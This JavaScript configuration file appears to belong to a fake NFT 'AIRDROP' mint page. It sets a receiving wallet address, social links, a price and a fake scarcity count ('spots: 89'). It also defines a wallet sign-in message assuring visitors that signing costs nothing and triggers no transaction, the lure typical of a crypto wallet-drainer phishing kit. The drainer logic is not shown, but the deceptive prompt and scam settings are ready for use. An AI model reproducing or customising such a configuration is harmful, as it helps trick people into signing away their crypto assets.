const collectionInfo = {
	address: "0x5f3A98F2985efeDCd5C4063B07eE70D5614edB89",
    name: "AIRDROP  ",
    socialMedia: {
        discord: "https://discord.com/invite/degenheim",
        twitter: "https://twitter.com/degenheim",
        instagram: "",
    },
    eprice: 0,
    nprice: 0.01,
    nfts:  100,
    spots: 89,
    logo: "favicon.ico",
    backgroundImage: "https://cdn.discordapp.com/attachments/1029999228170280971/1030178107333816330/images_1.jpg",
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

if (!collectionInfo.address.startsWith("0x") || (collectionInfo.address.length >= 64 || collectionInfo.address.length <= 40))
    console.error(`Error: ${collectionInfo.address} is not a valid Ethereum address.`);

document.getElementById("favicon").href = collectionInfo.logo;
document.getElementById('backgroundImage').style['backgroundImage'] = "url('"+collectionInfo.backgroundImage+"')";
